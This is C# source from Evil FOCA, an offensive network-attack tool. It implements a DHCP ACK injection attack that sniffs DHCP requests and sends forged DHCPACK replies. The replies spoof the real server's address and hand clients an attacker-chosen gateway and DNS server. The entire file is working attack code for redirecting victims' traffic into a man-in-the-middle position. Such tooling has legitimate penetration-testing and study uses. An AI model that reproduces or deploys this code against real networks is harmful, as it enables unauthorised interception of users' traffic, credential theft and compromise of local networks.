/* 
Evil FOCA
Copyright (C) 2015 ElevenPaths

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.  If not, see <http://www.gnu.org/licenses/>.
*/
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using SharpPcap.WinPcap;
using System.Net;
using System.Threading;
using System.Net.NetworkInformation;
using PacketDotNet;
using System.Runtime.InteropServices;
using evilfoca.Data;

namespace evilfoca.Attacks
{
    // Este ataque es pasivo
    class DHCPACKInjection
    {
        private WinPcapDevice device;
        private SynchronizedCollection<Data.Attack> attacks;

        static IPAddress DHCPIP = new IPAddress(0);
        static PhysicalAddress DHCPMAC = null;
        static DHCP.optionsResponse optionResponseStatic = InitializeResponse();

        static private DHCP.optionsResponse InitializeResponse()
        {
            DHCP.optionsResponse option = new DHCP.optionsResponse();
            option.messageType.optionHeader.option = DHCP.TAG_DHCP_MESSAGE;
            option.messageType.optionHeader.lenght = 1;
            option.messageType.type = DHCP.DHCPACK;

            option.serverID.optionHeader.option = DHCP.TAG_SERVER_ID;
            option.serverID.optionHeader.lenght = 4;
            option.serverID.id = 0;  //To fill with the Server IP

            option.addressLeaseTime.optionHeader.option = DHCP.TAG_IP_LEASE;
            option.addressLeaseTime.optionHeader.lenght = 4;
            option.addressLeaseTime.time = (uint)IPAddress.HostToNetworkOrder((int)86400);  //1 days in mins

            option.subnetMask.optionHeader.option = DHCP.TAG_SUBNET_MASK;
            option.subnetMask.optionHeader.lenght = 4;
            option.subnetMask.mask = (uint)IPAddress.Parse("255.255.255.0").Address;

            option.route.optionHeader.option = DHCP.TAG_GATEWAY;
            option.route.optionHeader.lenght = 4;
            option.route.ip = 0;  //To fill with the gateway

            option.domainNameServer.optionHeader.option = DHCP.TAG_DOMAIN_SERVER;
            option.domainNameServer.optionHeader.lenght = 4;
            option.domainNameServer.ip = 0;  //To fill with the DNS

            option.endOptions = 0xFF;
            return option;
        }

        public DHCPACKInjection(WinPcapDevice device, SynchronizedCollection<Data.Attack> attacks)
        {
            this.device = device;
            this.attacks = attacks;
        }

        public bool CheckIfIsDHCP(Packet p)
        {
            if (p.PayloadPacket == null || p.PayloadPacket.PayloadPacket == null ||
                !(p.PayloadPacket.PayloadPacket is UdpPacket) ||
                ((p.PayloadPacket.PayloadPacket as UdpPacket).DestinationPort != 67 && (p.PayloadPacket.PayloadPacket as UdpPacket).DestinationPort != 68))
                return false;
            else
                return true;
        }

        unsafe public void AnalyzePacket(WinPcapDevice device, Packet p)
        {
            if (p.PayloadPacket == null || p.PayloadPacket.PayloadPacket == null || !(p.PayloadPacket.PayloadPacket is UdpPacket))
                return;
            UdpPacket udp = (UdpPacket)p.PayloadPacket.PayloadPacket;
            if (udp.ParentPacket == null)
                return;
            if (!(udp.ParentPacket is IPv4Packet))
                return;

            IPv4Packet packetIpLayer = (IPv4Packet)udp.ParentPacket;
            if (udp.PayloadData.Length < sizeof(DHCP.bootp))
                return;
            DHCP.bootp* dhcp = (DHCP.bootp*)Marshal.UnsafeAddrOfPinnedArrayElement(udp.PayloadData, 0).ToPointer();

            DHCP.RequestedIP optionRequestedIP = new DHCP.RequestedIP();
            bool existsOptionRequestedIP = false;
            DHCP.ServerID optionServerID = new DHCP.ServerID();
            bool existsOptionServerID = false;
            string Strname = string.Empty;

            ushort bp_vend_len = (ushort)(udp.Length - Marshal.SizeOf(*dhcp) + 4);
            uint pos = 4;
            while (pos < bp_vend_len)
            {
                byte option = dhcp->bp_vend[pos];
                if (option == 0xff)
                {
                    break;
                }
                byte len = dhcp->bp_vend[pos + 1];
                switch (option)
                {
                    case DHCP.TAG_DHCP_MESSAGE:
                        {
                            DHCP.MessageType* mtype = (DHCP.MessageType*)(dhcp->bp_vend + pos);
                            //We save the real DHCP IP
                            if (mtype->type == DHCP.DHCPACK && packetIpLayer.SourceAddress.Address != 0)
                                DHCPIP = packetIpLayer.SourceAddress;
                            //We get the DHCP Server MAC
                            if (mtype->type == DHCP.DHCPOFFER)
                                DHCPMAC = (p as EthernetPacket).SourceHwAddress;
                            //We only continue if it's a DHCP Request 
                            if (mtype->type != DHCP.DHCPREQUEST)
                                return;
                            break;
                        }
                    case DHCP.TAG_REQUESTED_IP:
                        {
                            optionRequestedIP.id = ((DHCP.RequestedIP*)(dhcp->bp_vend + pos))->id;
                            existsOptionRequestedIP = true;
                            break;
                        }
                    case DHCP.TAG_SERVER_ID:
                        {
                            optionServerID.id = ((DHCP.ServerID*)(dhcp->bp_vend + pos))->id;
                            DHCPIP = new IPAddress(optionServerID.id);
                            existsOptionServerID = true;
                            break;
                        }
                    case DHCP.TAG_HOSTNAME:
                        {
                            byte* chr = (((DHCP.Hostname*)(dhcp->bp_vend + pos))->name);
                            byte lenght = ((DHCP.Hostname*)(dhcp->bp_vend + pos))->optionHeader.lenght;
                            for (int i = 0; i < lenght; i++)
                                Strname += (char)chr[i];
                            break;
                        }
                }
                pos += (uint)len + 2; //The option and the length field
            }

            bool realizarataque = false;
            string dns = string.Empty;
            string gateway = string.Empty;
            string MAC;
            foreach (Data.Attack attack in attacks.Where(A => A.attackType == Data.AttackType.DHCPACKInjection && A.attackStatus == Data.AttackStatus.Attacking))
            {
                dns = (attack as DHCPACKInjectionAttack).dns;
                gateway = (attack as DHCPACKInjectionAttack).gateway;
                MAC = (attack as DHCPACKInjectionAttack).MAC;
                //If filter does not apply not continue
                if (!string.IsNullOrEmpty(MAC) && !(p.PayloadPacket as EthernetPacket).SourceHwAddress.Equals(PhysicalAddress.Parse(MAC)))
                    realizarataque = false;
                else
                {
                    realizarataque = true;
                    break;
                }
            }
            if (!realizarataque)
                return;

            //Configuration used in the attack
            PhysicalAddress MACUsed;
            if (Program.CurrentProject.data.settings.UseRealDHCPData)
            {
                if (DHCPMAC != null)
                    MACUsed = DHCPMAC;
                else //If the real dhcp server mac is not found we use the computer network device mac
                    MACUsed = device.Interface.MacAddress;
            }
            else
            {
                MACUsed = PhysicalAddress.Parse(Program.CurrentProject.data.settings.DHCPFakeServerMAC);
            }

            IPAddress IPUsed;
            if (Program.CurrentProject.data.settings.UseRealDHCPData)
            {
                if (existsOptionServerID)
                    IPUsed = new IPAddress(optionServerID.id);
                else
                {
                    if (DHCPIP.Address == 0)
                    {
                        Program.LogThis("DHCP IP Address unknown, using 0.0.0.0 as IP source", Logs.Log.LogType.DHCPACKInjection);
                        IPUsed = IPAddress.Parse("0.0.0.0");
                    }
                    else
                    {
                        IPUsed = DHCPIP;
                    }
                }
            }
            else
            {
                IPUsed = IPAddress.Parse(Program.CurrentProject.data.settings.DHCPFakeServerIP);
            }

            //Now we create a fake response
            EthernetPacket response = new EthernetPacket(MACUsed, new PhysicalAddress(new byte[] { 0xff, 0xff, 0xff, 0xff, 0xff, 0xff }), EthernetPacketType.IpV4);
            response.PayloadPacket = new IPv4Packet(IPUsed, new System.Net.IPAddress(0xffffffff));

            //We want to follow the IP communication
            (response.PayloadPacket as IPv4Packet).Id = packetIpLayer.Id;

            response.PayloadPacket.PayloadPacket = new UdpPacket(67, 68);
            response.PayloadPacket.PayloadPacket.PayloadData = new byte[16];
            response.PayloadPacket.PayloadPacket.PayloadData = new byte[sizeof(DHCP.bootp) + sizeof(DHCP.optionsResponse)];

            dhcp->bp_op = DHCP.BOOTPREPLY;
            if (existsOptionRequestedIP)
                dhcp->bp_yiaddr = optionRequestedIP.id;
            else if (dhcp->bp_ciaddr != 0)
                dhcp->bp_yiaddr = dhcp->bp_ciaddr;
            else
            {
                return;
            }

            dhcp->bp_flags = 0;
            Marshal.Copy(new IntPtr(dhcp), response.PayloadPacket.PayloadPacket.PayloadData, 0, sizeof(DHCP.bootp));

            //We need to fill the optionResponseStatic fields
            if (existsOptionServerID)
                optionResponseStatic.serverID.id = optionServerID.id;
            optionResponseStatic.serverID.id = (uint)IPUsed.Address;
            optionResponseStatic.route.ip = (uint)IPAddress.Parse(gateway).Address;
            optionResponseStatic.domainNameServer.ip = (uint)IPAddress.Parse(dns).Address;

            fixed (DHCP.optionsResponse* op = &optionResponseStatic)
            {
                Marshal.Copy(new IntPtr(op), response.PayloadPacket.PayloadPacket.PayloadData, sizeof(DHCP.bootp), sizeof(DHCP.optionsResponse));
            }

            response.UpdateCalculatedValues();
            (response.PayloadPacket as IPv4Packet).UpdateCalculatedValues();
            (response.PayloadPacket as IPv4Packet).UpdateIPChecksum();
            (response.PayloadPacket.PayloadPacket as UdpPacket).UpdateCalculatedValues();
            (response.PayloadPacket.PayloadPacket as UdpPacket).UpdateUDPChecksum();

            device.SendPacket(response);
            string message = string.Format("DHCP ACK sent to a {0} DHCP Request", new IPAddress(dhcp->bp_yiaddr).ToString());
            Program.LogThis(message, Logs.Log.LogType.DHCPACKInjection);
        }
    }
}
